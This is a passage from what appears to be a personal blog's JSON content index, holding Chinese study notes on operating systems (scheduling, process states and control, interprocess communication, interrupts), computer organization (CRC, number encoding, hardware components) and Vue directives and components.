优点当一个线程被阻塞后，别的线程还可以继续执行，并发能力强。多线程可在多核处理机上并行执行。 缺点一个用户进程会占用多个内核级线程，线程切换由操作系统内核完成，需要切换到核心态，因此线程管理成本高，开销大。 多对多模型 n用户及线程映射到m个内核级线程（n &gt;&#x3D; m）。每个用户进程对应m个内核级线程 优点克服了多对一模型并发度不高的缺点，又克服了一对一模型中一个用户进程占用太多内核级线程，开销太大的缺点。 知识回顾 处理机的调度基本概念 1.当一堆任务要处理，但由于资源有限，这些事情没法同时处理。这就需要确定某种规则来决定处理这些任务的顺序。2.在多道程序系统中，进程的数量往往是多余处理机的个数的，这样不可能同时并行地处理各个进程。处理机调度，就是从就绪队列中按照一定地算法选择一个进程并将处理机分配给它运行，以实现进程地并发执行。 三个层次高级调度（作业调度） 由于内存空间有限，有时无法将用户提交的作业全部放入内存，因此就需要确定某种规则来决定将作业调入内存的顺序 高级调度（作业调度）。按一定的原则从外存上处于后备队列的作业中挑选一个（或多个）作业，给他们分配内存等必要资源，并建立相应进程（建立PCB），以使它（们）获得竞争处理机的权利。 高级调度是辅存（外存）与内存之间的调度。每个作业只调入一次，调出一次。作业调入时会建立相应的PCB，作业调出时才撤销PCB。高级调度主要是指调入的问题，因为只有调入的时机需要操作系统来确定，但调出的时机必然是作业运行结束才调出。 中级调度（内存调度） 引入了虚拟存储技术之后，可将暂时不能运行的进程调至外存等待。等它重新具备了运行条件且内存又稍有空闲，再重新调入内存。这么做的目的是为了提高内存利用率和系统吞吐量。 暂时调到外存等待的进程状态为挂起状态，值得注意的是，PCB并不会一起调到外存，而是会常驻内存。PCB中会记录进程数据在外存中的存放位置，进程状态等信息，操作系统通过内存中的PCB来保持对各个进程的监控、管理。被挂起的进程PCB会被放到挂起队列中。 中级调度（内存调度），就是要决定将哪个处于挂起状态的进程重新调入内存。一个进程可能会被多次调出、调出内存，因此中级调度发生的频率要比高级调度更高。 低级调度（进程调度） 低级调度（进程调度），其主要任务是按照某种方法和策略从就绪队列中选取一个进程，将处理机分配给它。， 进程调度是操作系统中最基本的一种调度，在一般的操作系统中都必须配置进程调度。进程调度的频率很高，一般几十毫秒一次。 三层调度的联系、对比 补充知识进程的“挂起态” 暂时调到外存等待的进程状态为挂起状态（挂起态，suspend） 挂起态又可以进一步细分为就绪挂起、阻塞挂起两中状态 七状态模型 知识回顾 进程调度的时机切换与过程调度方式时机 什么时候需要进程调度当前运行的进程主动放弃处理机 进程正常终止 运行过程中发生异常而终止 进程主动请求阻塞（如 等待I&#x2F;O） 当前运行的进程被动放弃处理机 分给进程的时间片用完 有更紧急的事需要处理（如I&#x2F;O中断） 有更高优先级的进程进入就绪队列 什么时候不能进行进程调度 在处理中断的过程中，中断处理过程复杂，与硬件密切相关，很难做到在中断处理过程中进行进程切换 进程在操作系统内核程序临界区中 在原子操作过程中（原语）。原子操作不可中断，要一气呵成（如 修改PCB中进程状态标志，并把PCB放到相应队列） 切换与过程“狭义的调度”与“切换”的区别 狭义的进程调度指的是从就绪队列中选中一个要运行的进程。（这个进程可以是刚刚被暂停执行的进程，也可能是另一个进程，后一种情况就需要进程切换） 进程切换是指一个进程让出处理机，由另一个进程占用处理机的过程。 广义的进程调度包含了选择一个进程和进程切换两个步骤。 进程切换的过程主要完成了： 对原来运行进程各种数据的保存 对新进程各种数据的恢复（如：程序计数器、程序状态字、各种数据寄存器等处理机现场信息，这些信息一般保存在进程控制块） 注意：进程切换是有代价的，因此如果过于频繁的进行进程调度、切换，必然会使整个系统的效率降低，是系统大部分时间都花在了进程切换上，而真正用于执行进程的时间减少。 进程切换的过程需要做什么方式非剥夺调度式（非抢占式） 非剥夺调度方式，又称非抢占方式。即，只允许进程主动放弃处理机。在运行过程中即便有更紧迫的任务到达，当前进程依然会继续使用处理机，直到该进程终止或主动要求进入阻塞态 实现简单，系统开销小但是无法及时处理紧急任务，适合于早期的批处理系统 剥夺调度方式（抢占式） 剥夺调度方式，又称抢占方式。当一个进程正在处理机上执行时，如果有一个更重要或更紧迫的进程需要使用处理机，则立即暂停正在执行的过程，将处理机分配给更重要紧迫的那个进程。 可以优先处理更紧急的进程，也可以实现让各进程按时间片轮流执行的功能（通过时钟中断）。适合于分时操作系统、实时操作系统。 知识回顾","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"bilibili大学","slug":"bilibili大学","permalink":"http://example.com/tags/bilibili%E5%A4%A7%E5%AD%A6/"}],"author":"Dokey_"},{"title":"操作系统 - 进程的状态与转换","slug":"操作系统-进程的状态与转换","date":"2022-07-31T13:29:00.000Z","updated":"2023-03-25T14:35:06.494Z","comments":true,"path":"60210.html","link":"","permalink":"http://example.com/60210.html","excerpt":"","text":"操作系统的状态与转换 操作系统的状态与转换状态 进程是程序的一次执行。在这个执行过程中，有时进程正在被CPU处理，有时又需要等待CPU服务，可见进程的状态是会有各种变化的，为了方便对各个进程的管理，操作系统需要将进程合理地划分为几种状态 运行态（Running） 单核处理机环境下，每一个时刻最多只有一个进程处于运行态。（双核环境下可以同时有两个进程处于运行态） 占有CPU，并在CPU上运行 就绪态（Ready） 进程已经拥有了除处理机之外所有需要地资源，一旦获得处理机，即可立即进入运行态开始运行 已经具备运行条件，但由于没有空闲CPU，而暂时不能运行 阻塞态（Waiting&#x2F;Blocked，又称：等待态） 等待操作系统分配打印机、等待读磁盘操作地结果。CPU是计算机中最昂贵地部件，为了提高CPU地利用率，需要先将其他进程需要的资源分配到位，才能得到CPU的服务 因等待某一事件而暂时不能运行 创建态（New，又称：新建态） 操作系统需要完成创建进程。操作系统为该进程分配所需的内存空间等系统资源，并为其创建、初始化PCB 进程正在被创建，操作系统为进程分配资源、初始化PCB 终止态（Terminated，又称：结束态） 进程运行结束（或者由于bug导致进程无法继续执行下去，比如数组越界错误），需要撤销进程。操作系统需要完成撤销进程相关的工作。完成将分配给进程的资源回收，撤销进程PCB等工作 进程正在从系统中撤销，操作系统会回收进程拥有的资源、撤销PCB 进程状态间的转换就绪态 &#x3D;&gt; 运行态 拥有除处理机外的所有需要的资源 进程被调度 运行态 &#x3D;&gt; 就绪态 时间片到或处理机被抢占 运行态 &#x3D;&gt; 阻塞态 进程用“系统调用”的方式申请某种系统资源，或者请求等待某个事件发生 是一种进程自身做出的主动行为 阻塞态 &#x3D;&gt; 就绪态 申请的资源被分配，或等待的事件发生 不是进程自身能控制的，是一种被动行为 注意：不能由阻塞态直接转换为运行态，也不能由就绪态直接转换为阻塞态（因为进入阻塞态是进程主动请求的，必然需要进程在运行时才能发出这种请求） 知识回顾 进程控制基本概念什么是进程控制 进程控制就是要实现进程状态的转换 进程控制的主要功能是对系统中的所有进程实施有效的管理，它具有创建新进程、撤销已有进程、实现进程状态转换等功能 如何实现进程控制 进程控制相关的原语 用原语实现进程控制。原语的特点是执行期间不允许中断，只能一气呵成。这种不可被中断的操作即原子操作。原语采用“关中断指令”和“开中断指令”实现。 关&#x2F;开中断指令的权限非常大，必然是只允许在核心态下执行的特权指令 进程控制会导致进程状态的转换。无论哪个原语，要做的无非三类事情： 更新PCB中的信息（如修改进程状态标志、将运行环境保存到PCB、从PCB恢复运行环境） a. 所有的进程控制原语一定都会修改进程状态标志 b. 剥夺当前运行进程的CPU使用权必然需要保存其运行环境 c.某进程开始运行前必然要恢复其运行环境 将PCB插入合适的队列 分配&#x2F;回收资源 进程的创建创建原语 申请空白PCB 为新进程分配所需资源 初始化PCB 将PCB插入就绪队列 引起进程创建的事件 用户登录 分时系统中，用户登录成功，系统会为其建立一个新进程 作业调度 多道批处理系统中，有新的作业放入内存时，会为其建立一个新的进程 提供服务 用户向操作系统提出某些请求时，会建立一个进程处理该请求 应用请求 由用户进程主动请求创建一个子进程 进程的终止撤销原语 从PCB集合中找到终止进程的PCB 若进程正在运行，立即剥夺CPU，将CPU分配给其他进程 终止其所有子进程 将该进程拥有的所有资源归还给父进程或操作系统 删除PCB 引起进程终止的事件 正常结束 异常结束 外界干预 进程的阻塞阻塞原语 找到要阻塞的进程对应的PCB 保护进程运行现场，将PCB状态信息设置为“阻塞态”，暂时停止进程运行 将PCB插入相应事件的等待队列 引起进程阻塞的事件 需要等待系统分配某种资源 需要等待相互合作的其他进程完成工作 进程的唤醒唤醒原语 在事件等待队列中找到PCB 将PCB从等待队列移除，设置状态为就绪态 将PCB插入就绪队列，等待被调度 引起进程唤醒的事件 等待的事件发生 进程的切换切换原语 将运行环境信息存入PCB PCB移入相应队列 选择另一个进程执行，并更新其PCB 根据PCB恢复新进程所需的运行环境 引起进程切换的事件 当前进程时间片到 有更高优先级的进程到达 当前进程主动阻塞 当前进程终止 知识回顾 进程通信 进程通信就是指进程之间信息交换。进程是分配系统资源的单位（包括内存地址空间），因此各进程拥有的内存地址空间相对独立为了保证安全，一个进程不能直接访问另一个进程的地址空间 共享存储 两个进程对共享空间的访问必须是互斥的操作系统只负责提供共享空间和同步互斥工具（如P、V操作） 基于数据结构的共享 比如共享空间里只能放一个长度为10的数组。这种共享方式速度慢、限制多，是一种低级通信方式 基于存储区的共享 在内存中画出一块共享存储区，数据的形式、存放位置都由进程控制，而不是操作系统。相比之下，这种共享方式速度更快，是一种高级通信方式。 消息传递 进程间的数据交换以格式化的消息（Message）为单位。进程通过操作系统提供的“发送消息&#x2F;接受消息”两个原语进行数据交换传递结构化的消息（消息头&#x2F;消息体）；消息头包括：发送进程ID、接受进程ID、消息类型、消息长度等格式化的信息 直接通信方式 消息直接挂到接收进程的消息缓冲队列中 间接通信方式 消息要先发送到中间实体（信箱）中，因此也称“信箱通信方式”。 管道通信 “管道”是指用于连接读写进程的一个共享文件，又名pipe文件。就是在内存中开辟一个大小固定的缓冲区 管道只能采用半双工通信，某一时间段内只能实现单向的传输。如果要实现双向同时通信，则需要设置两个管道。 各进程要互斥的访问管道 数据以字符流的形式写入管道，当管道写满时，写进程的writer()系统调用将被阻塞，等待读进程将数据取走，当读进程将数据全部取走后，管道变空，此时读进程的read()系统调用将被阻塞 如果没写满，就不允许读。如果没读空，就不允许写。 数据一旦被读出，就从管道中被抛弃，这就意味着读进程最多只能有一个，否则可能会读错数据的情况。 知识回顾","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"bilibili大学","slug":"bilibili大学","permalink":"http://example.com/tags/bilibili%E5%A4%A7%E5%AD%A6/"}],"author":"Dokey_"},{"title":"操作系统 - 中断和异常","slug":"操作系统-中断和异常","date":"2022-07-20T16:11:00.000Z","updated":"2023-03-25T14:35:06.481Z","comments":true,"path":"4461.html","link":"","permalink":"http://example.com/4461.html","excerpt":"","text":"操作系统的中断和异常 中断和异常中断机制的诞生 本质：发生中断就意味着需要操作系统介入，开展管理工作 中断的概念和作用 当中断发生时，CPU立即进入核心态 当中断发生后，当前运行的进程暂停运行，并由操作系统内核对中断进行处理 对于不同的中断信号，会进行不同的处理 发生了中断，就意味着需要操作系统介入，开展管理工作。由于操作系统的管理工作（比如进程切换、分配I&#x2F;O设备等）需要使用特权指令，因此CPU要从用户态转为核心态。中断可以使CPU从用户态切换为核心态。使操作系统获得计算机的控制权。有了中断，才能实现多道程序并发执行。 用户态、核心态之间的切换是怎么实现的？ “用户态 &#x3D;&gt; 核心态”是通过中断实现的，并且中断是唯一途径 “核心态 &#x3D;&gt; 用户态”的切换时通过执行一个特权指令，将程序状态字（PSW）的标志位设置为“用户态” 中断的分类 区别 内中断信号来源：CPU内部与当前执行的指令有关 外中断信号来源：CPU外部与当前执行的指令无关 内中断 也称异常、例外、陷入 自愿中断 – 指令中断（系统调用） 强迫中断 硬件故障（缺页） 软件中断（如：整数除0） 外中断 外设请求 人工干预 另一种方式 外中断的处理过程 每条指令执行结束后，CPU检查是否有外部中断信号 若有外部中断信号，则需要保护被中断进程的CPU环境 根据中断信号类型转入相应中断处理程序 恢复原进程的CPU环境并退出中断，返回原进程继续往下执行 知识回顾 系统调用 系统调用的概念 “系统调用” 是操作系统提供给应用程序（程序员&#x2F;编程人员）使用的接口，可以理解为一种可供应用程序调用的特殊函数，应用程序可以发出系统调用请求来获得操作系统的服务。 应用程序通过系统调用请求操作系统的服务。系统中的各种共享资源都由操作系统统一掌管，因此在用户程序中，凡是与资源有关的操作（如存储分配、I&#x2F;O操作，文件管理等），都必须通过系统调用的方式向操作系统提出服务请求，由操作系统代为完成。这样可以保证系统的稳定性和安全性，防止用户进行非法操作。 系统调用（按功能分类） 系统调用相关处理涉及到对系统资源的管理、对进程的控制，这些功能需要执行一些特权指令才能完成，因此系统调用的相关处理需要在核心态下进行 1. 设备管理：完成设备的 请求/释放/启动 等功能 2. 文件管理：完成文件的读/写/创建/删除 等功能 3. 进程控制：完成进程的 创建/撤销/阻塞/唤醒/ 等功能 4. 进程通信：完成进程之间的 消息传递/信号传递 等功能 5. 内存管理：完成内存的分配/回收 等功能 系统调用背后的过程 知识回顾 进程的定义、组成、组织方式、特征 进程的定义 为了方便操作系统管理，完成各程序并发执行，引入进程、进程实体的概念 系统为每个运行的程序配置一个数据结构，称为进程控制块（PCB），用来描述进程的各种信息（如进程代码存放位置） PCB、程序段、数据段三部分构成了进程实体（进程映像）。一般情况下，我们把进程实体简称为进程，例如，所谓创建进程，实质上是创建进程实体中的PCB；而撤销进程，实质上是撤销进程实体中的PCB PCB是进程存在的唯一标志 从不同的角度，进程可以有不同的定义，比较传统典型的定义有： 进程是程序的一次执行过程。 进程是一个程序及其数据在处理机上顺序执行时所发生的活动。 进程是具有独立功能的程序在数据集合上运行的过程（强调“动态性”），它是系统进行资源分配和调度的一个独立单位 引入进程实体的概念后，可把进程定义为： 进程是进程实体的运行过程，是系统进行资源分配和调度的一个独立单位。 注：严格来说，进程实体和进程并不一样，进程实体是静态的，进程则是动态的，除非题目专门考察二者的区别，否则可以认为进程实体就是进程。 进程的组成 进程（进程实体）由程序段、数据段、PCB三部分组成 程序代码存放在程序段 程序运行时使用、产生的运算数据。如全局变量、局部变量、宏定义的常量存放在数据段内 操作系统通过PCB来管理进程，因此PCB中应该包含操作系统对其进行管理所需的各种信息。 PCB 进程的管理者（操作系统）所需的数据都在PCB中 进程描述信息 进程标识符PID 当进程被创建时，操作系统会为该进程分配一个唯一的、不重复的ID，用于区分不同的进程。 用户标识符UID 进程控制和管理信息 进程当前状态 进程优先级 资源分配清单 程序段指针 数据段指针 键盘 鼠标 处理机相关信息 各种寄存器指 当进程切换时需要把进程当前的运行情况记录下来保存在PCB中，如程序计数器的值表示了当前程序执行到哪一句。 进程的组织方式 执行指针：指向当前处于运行态（执行态）的进程 就绪队列指针：指向当前处于就绪态的进程 阻塞队列指针：指向当前处于阻塞态的进程，很多操作系统还会根据阻塞原因不同，再分为多个阻塞队列 链接方式 按照进程状态将PCB发为多个队列 操作系统持有指向各个队列的指针 索引方式 根据进程状态的不同，建立几张索引表 操作系统持有指向各个索引表的指针 进程的特征动态性 进程是程序的一次执行过程，是动态地产生、变化、消亡的 并发性 内存中有多个进程实体，各进程可并发执行 独立性 进程是能独立运行、独立获得资源、独立接受调度的基本单位 异步性 各进程按各自独立的、不可预知的速度向前推进，操作系统要提供“进程同步机制”来解决异步问题 异步性会导致并发程序执行结果的不确定性 结构性 每个进程都会配置一个PCB。结构上看，进程由程序段、数据段、PCB组成 知识回顾","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"bilibili大学","slug":"bilibili大学","permalink":"http://example.com/tags/bilibili%E5%A4%A7%E5%AD%A6/"}],"author":"Dokey_"},{"title":"操作系统 - 操作系统的特征","slug":"操作系统-操作系统的特征","date":"2022-07-19T15:47:00.000Z","updated":"2023-03-25T14:35:06.483Z","comments":true,"path":"51415.html","link":"","permalink":"http://example.com/51415.html","excerpt":"","text":"操作系统的四个特征 操作系统的特征 并发和共享是两个最基本的特征，二者互为存在条件 并发 指两个或多个事件在同一时间间隔内发生。这些事件宏观上是同时发生的，但微观上是交替发生的 并行：指两个或多个事件在同一时刻同时发生 操作系统的并发性：指计算机系统中同时存在着多个运行着的程序 共享 互斥共享方式：系统中的某些资源，虽然可以提供给多个进程使用，但一个时间段内只允许一个进程访问该资源 同时共享方式：系统中的某些资源，允许一个时间段内由多个进程“同时”对它们进行访问 虚拟 没有并发性虚拟性就无意义 虚拟是指把一个物理上的实体变为若干个逻辑上的对应物。物理实体（前者）是实际存在的，而逻辑上对应物（后者）是用户感受到的 空分复用技术（虚拟存储技术） 时分复用技术（虚拟处理器） 异步 在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底，而是走走停停，以不可预知的速度向前推进，这就是进程的异步性 操作系统的发展与分类手工操作阶段 主要缺点：用户独占全机，人机速度矛盾导致资源利用率极低 批处理阶段 单道批处理系统：引入脱机输入&#x2F;输出技术（用磁带完成），并监督程序负责控制作业的输入、输出 主要优点：缓解了一定程度的人机速度矛盾，资源利用率有所提升 主要缺点：内存中仅能有一道程序运行，只有该程序运行结束后才能调入下一道程序，CPU有大量的时间是在等待I&#x2F;O完成。资源利用率依然很低 多道批处理系统（操作系统开始出现） 主要优点：多道程序并发执行，共享计算机资源。资源利用率大幅提升，CPU和其他资源保持“忙碌”状态，系统吞吐量增大。 主要缺点：用户响应时间过长，没有人机交互功能（用户提交自己的作业之后就只能等待计算机处理完成，中间不能控制自己的作业执行） 分时操作系统 计算机以时间片为单位轮流为各个用户&#x2F;作业服务，各个用户可通过终端与计算机进行交互 主要优点：用户请求可以被即时响应，解决了人机交互问题。允许多个用户同时使用一台计算机，并且用户对计算机的操作相互独立，感受不到别人的存在 主要缺点：不能优先处理一些紧急任务。操作系统对各个用户&#x2F;作业都是完全公平的，循环地为每个用户&#x2F;作业服务一个时间片，不区分任务地紧急性 实时操作系统 在实时操作系统地控制下，计算机系统接收到外部信号后及时进行处理，并且要在严格地时限内处理完事件。实时操作系统地主要特点是及时性和可靠性。 硬实时系统：必须在绝对严格的规定时间内完成处理（如：导弹控制系统、自动驾驶系统） 软实时系统：能接受偶尔违反时间规定（如：12306火车订票系统） 主要优点：能够优先响应一些紧急任务，某些紧急任务不需时间片排队 网络操作系统 伴随着计算机网络的发展而诞生，能把网络中各个计算机有机的结合起来，实现数据传送等功能，实现网络中各种资源的共享（如文件共享）和各台计算机之间的通信。（如：Windows NT就是一种典型的网络操作系统，网站服务器就可以使用） 分布式操作系统 主要特点是分布式和并行性。系统中的各台计算机地位相同，任何工作都可以分布在这些计算机上，由它们并行、协同完成这个任务 个人计算机操作系统 Windows XP、MacOS，方便个人使用 知识回顾 操作系统的运行机制、体系结构运行机制 两种指令 特权指令（如：内存清零指令） 非特权指令 （如：普通的运算指令） 两种处理器状态 用程序状态字寄存器（PSW）中的某标志位来标识当前处理器处于什么状态。如0为用户态，1为和心态 核心态（管态） 用户态（目态） 两种程序 内核程序：是系统的管理者，既可以执行特权指令，也可以执行非特权指令，运行在核心态 应用程序：为了保证系统能安全运行，普通应用程序只能执行非特权指令，运行在用户态 操作系统内核 内核是计算机上配置的底层软件，是操作系统最基本、最核心的部分；实现操作系统内核功能的那些程序就是内核程序 时钟管理：实现计时功能 中断管理 原语 设备驱动、CPU切换等 是一种特殊的程序 处于操作系统最底层，是最接近硬件的部分 这种程序的运行具有原子性 – 其运行只能一气呵成，不可中断 运行时间较短、调用频繁 对系统资源进行管理的功能 进程管理 存储器管理 设备管理 操作系统体系结构 大内核 将操作系统的主要功能模块都作为系统内核，运行在核心态 优点：高性能 缺点：内核代码庞大，结构混乱，难以维护 微内核 只把最基本的功能保留在内核 优点：内核功能少，结构清晰，方便为何 缺点：需要频繁的在核心态和用户态之间切换，性能低 知识回顾","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"bilibili大学","slug":"bilibili大学","permalink":"http://example.com/tags/bilibili%E5%A4%A7%E5%AD%A6/"}],"author":"Dokey_"},{"title":"操作系统 - 概念功能和目标","slug":"操作系统-概念功能和目标","date":"2022-07-19T14:27:00.000Z","updated":"2023-03-25T14:35:06.486Z","comments":true,"path":"30168.html","link":"","permalink":"http://example.com/30168.html","excerpt":"","text":"操作系统 操作系统的概念（定义）功能和目标 操作系统的概念（定义） 操作系统（Operating System， OS）是指控制和管理整个计算机系统的硬件和软件资源，并合理地组织调度计算机的工作和资源的分配，以提供给用户和其他软件方便的接口和环境，它是计算机系统中最基本的系统软件 负责管理协调硬件、软件等计算机资源的工作 为上层的应用程序、用户提供简单易用的服务 操作系统是系统软件，而不是硬件 操作系统的功能和目标 补充知识：进程是一个程序的执行过程。执行前需要将该程序放到内存中，才能被CPU处理。 操作系统作为系统资源的管理（这些资源包括软件、硬件、文件等），需要提供什么功能？ 追求的目标：安全、高效 1. 处理机管理 2. 存储器管理 3. 文件管理 4. 设备管理 操作系统作为用户与计算机硬件之间的接口，要为其上层的用户、应用程序提供简单易用的服务，需要实现什么功能？ 命令接口：允许用户直接使用 2. 程序接口：允许用户通过程序间接使用 3. GUI：现代操作系统中最流行的图形用户接口 操作系统作为最接近硬件的层次，需要在纯硬件的基础上实现什么功能？ 实现对硬件机器的拓展 没有任何软件支持的计算机称为裸机。在裸机上安装的操作系统，可以提供资源管理功能和方便用户的服务功能，将裸机改造成功能更强、使用更方便的机器 作为用户和计算机硬件之间的接口 提供的功能 – 用户接口 命令接口 1. 联机命令接口：用户说一句，系统做一句（交互式命令接口） 2. 脱机命令接口：用户说一堆，系统做一堆 程序接口：由一组系统调用组成（程序接口 &#x3D; 系统调用） 如 C:\\Windows\\System32\\user32.dll 程序员在程序中调用user32.dll（该调用过程即为系统调用）即可实现创建窗口等功能。只能通过用户程序间接使用。 GUI用户界面 目标：方便用户使用 知识回顾","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"bilibili大学","slug":"bilibili大学","permalink":"http://example.com/tags/bilibili%E5%A4%A7%E5%AD%A6/"}],"author":"Dokey_"},{"title":"循环冗余校验码","slug":"循环冗余校验码","date":"2022-07-10T03:31:00.000Z","updated":"2023-03-25T14:35:06.477Z","comments":true,"path":"40131.html","link":"","permalink":"http://example.com/40131.html","excerpt":"","text":"第二章 数据的表示和运算 循环冗余校验码（CRC码） 循环冗余校验码（Cyclic Redundancy Check, CRC） 基本思想 数据发送、接收方约定一个“除数”，数据出错导致余数改变 – 检测到错误 理论上可以证明循环冗余校验码的检错能力有以下特点： 可以检测出所有奇数个错误 可检测出所有双比特的错误 可检测出所有小于等于校验位长度的连续错误 知识回顾 定点数无符号数 整个机器字长的全部二进制均为数值位，没有符号位，相当于数的绝对值。 原码：用尾数表示真值的绝对值，符号位“0&#x2F;1”对应“正&#x2F;负” 反码： 若符号位为0，则反码与原码相同 若符号位为1，则数值位全部取反 补码 正数的补码 &#x3D; 原码 + 负数的补码 &#x3D; 反码末位 + 1（要考虑进位）","categories":[{"name":"计算机组成","slug":"计算机组成","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/"}],"tags":[{"name":"bilibili大学","slug":"bilibili大学","permalink":"http://example.com/tags/bilibili%E5%A4%A7%E5%AD%A6/"}],"author":"Dokey_"},{"title":"数据的表示和运算","slug":"数据的表示和运算","date":"2022-07-05T14:29:00.000Z","updated":"2023-03-25T14:35:06.498Z","comments":true,"path":"55074.html","link":"","permalink":"http://example.com/55074.html","excerpt":"","text":"第二章 数据的表示和运算 数据如何在计算机中表示？ 运算器如何实现数据的算数、逻辑运算？ 进位计数制 十进制、二进制、八进制、十六进制 十进制：逢十进一 二进制：逢二进一 八进制：逢八进一 十六进制：逢十六进一 其他进制 &#x3D;&#x3D;&#x3D;&gt; 十进制 r进制 二进制、八进制、十六进制之间的相互转换 十进制 &#x3D;&#x3D;&#x3D;&gt; 其他进制 真值和机器数 真值：符合人类习惯的数字 机器数：数字实际存到机器里的形式，正负号需要被“数字化” 知识回顾与重要考点 BCD码8421码 加法 当结果不在映射表中时，需要+6(0110)进行修正 ![upload successful](/images/pasted-89.png) 知识回顾与重要考点![upload successful](/images/pasted-90.png) 字符与字符串 英文字符 &#x3D;&#x3D;&#x3D;&gt; ASCII码 ASCII码 例题 中文字符 汉字的表示和编码 字符串 知识回顾与重要考点 海明码求解步骤 纠错 知识回顾","categories":[{"name":"计算机组成","slug":"计算机组成","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/"}],"tags":[{"name":"bilibili大学","slug":"bilibili大学","permalink":"http://example.com/tags/bilibili%E5%A4%A7%E5%AD%A6/"}],"author":"Dokey_"},{"title":"计算机系统的层次结构","slug":"计算机系统的层次结构","date":"2022-07-04T15:54:00.000Z","updated":"2023-03-25T14:35:06.499Z","comments":true,"path":"51751.html","link":"","permalink":"http://example.com/51751.html","excerpt":"","text":"计算机系统的层次结构 知识回顾与重要考点","categories":[{"name":"计算机组成","slug":"计算机组成","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/"}],"tags":[],"author":"Dokey_"},{"title":"计算机硬件的工作原理","slug":"8ddp071IApZdgpNA","date":"2022-07-04T14:43:25.000Z","updated":"2022-07-04T14:17:45.000Z","comments":true,"path":"18947.html","link":"","permalink":"http://example.com/18947.html","excerpt":"","text":"计算机各个硬件的工作原理 内部细节 主存储器的基本组成主存储器结构 存储体 – 数据在存储体内按地址存储 存储单元：每个存储单元存放一串二进制代码；每个地址对应一个存储单元 存储字（word）：存储单元中二进制代码的组合 存储字长存储单元中二进制代码的位数 存储元：即存储二进制的电子元件，每个存储元可存1bit MAR(Memory Address Register) 存储地址寄存器 MAR位数反应存储单元的个数 MAR &#x3D; 4位 &#x3D;&#x3D;&gt; 总共有2^4个存储单元 MDR(Memory Data Register) 存储数据寄存器 MDR位数 &#x3D; 存储字长 MDR &#x3D; 16位 &#x3D;&#x3D;&gt; 每个 存储单元可存放16bit；1个字（word）&#x3D; 16bit 运算器的基本组成 运算器用于实现算术运算（如：加减乘除）、逻辑运算（如：与或非） 运算器结构 ACC：累加器，用于存放操作数，或运算结果 MQ：乘商寄存器，在乘、除运算时，用于存放操作数或运算结果 X：通用的操作数寄存器，用于存放操作数 ALU：算术逻辑单元，通过内部复杂的电路实现算数运算、逻辑运算 控制器的基本组成控制器结构 CU(Control Unit)：控制单元，分析指令，给出控制信号 IR(Instruction Register)：指令寄存器，存放当前执行的指令 PC(Program Counter)：程序计数器，存放下一条指令地址，有自动加1功能 计算机的工作过程 知识回顾与重要考点 冯·诺伊曼计算机的特点 计算机有五大部分组成 指令和数据以同等地位存于存储器，可按地址寻访 指令和数据用二进制表示 指令由操作码和地址码组成 存储程序 以运算器为中心（现在一般以存储器为中心）","categories":[{"name":"计算机组成","slug":"计算机组成","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/"}],"tags":[{"name":"bilibili大学","slug":"bilibili大学","permalink":"http://example.com/tags/bilibili%E5%A4%A7%E5%AD%A6/"}]},{"title":"vue-day01","slug":"vue-01","date":"2022-07-04T14:15:28.000Z","updated":"2023-03-25T14:35:06.454Z","comments":true,"path":"15312.html","link":"","permalink":"http://example.com/15312.html","excerpt":"","text":"vue特性数据驱动视图在使用了vue的页面中，vue会监听数据的变化，从而自动重新渲染页面的结构。· 数据驱动视图是单向的数据绑定 双向数据绑定 mvvm mvvm工作原理 指令 内容渲染指令 + v-text 会覆盖原有内容 + `&#123;&#123;&#125;&#125;`--插值表达式，不会覆盖原有内容 + v-html 渲染包含html标签的字符串 属性绑定指令 v-bind: 简写为: 事件绑定指令 v-on指令或者@ 事件修饰符 + @click.prevent&#x3D;xxx() 按键修饰符 v-model指令的修饰符 v-if：动态创建或移除元素，实现元素的显示和隐藏 如果刚进入页面，某些元素默认不需要被展示，而且后期这个元素很可能也不需要被展示出来，此时v-if性能更好 v-show：动态添加或移除display:none样式来实现元素的显示和隐藏 如果需要频繁的切换元素的显示状态，使用v-show性能会更好 列表渲染指令 v-for：官方建议，只要用到v-for指令，那么一定要绑定一个 :key 属性；而且尽量把id作为key的值","categories":[{"name":"vue","slug":"vue","permalink":"http://example.com/categories/vue/"}],"tags":[],"author":"Dokey_"},{"title":"vue-day05","slug":"vue-day05","date":"2022-07-04T14:15:00.000Z","updated":"2023-03-25T14:35:06.464Z","comments":true,"path":"63697.html","link":"","permalink":"http://example.com/63697.html","excerpt":"","text":"vue-day05动态组件 component标签是vue内置的，作用：组建的占位符 is 属性的值，表示要渲染的组件的名字 is 属性的值，应该是组件在components节点下注册名称 当组件第一次被创建的时候，既会执行created生命周期，也会执行activated生命周期 当组件被激活的时候，只会触发activated生命周期，不再触发created，因为组件没有被重新创建 keep-alive 的 include属性 keep-alive 可以把内部的组件进行缓存，而不是销毁组件 include属性用来指定：只有名称匹配的组件会被缓存。多个组件之间使用英文逗号分隔 通过exclude属性指定哪些组件不需要被缓存；但是不要同时使用include和exclude这两个属性 拓展 如果在“声明组件”的时候，没有为组件指定name名称，则组件的名称默认就是“注册的时候的名称” 当提供了 name 属性之后，组件的名称就是 name 属性的值 对比： 1. 组件的“注册名称”的主要应用场景：以标签的形式，把注册好的组件，渲染和使用到页面结构之中 2. 组件声明时候的“name”名称的主要应用场景：结合标签实现组件缓存功能；以及在调试工具中看到组件的 name 名称 插槽 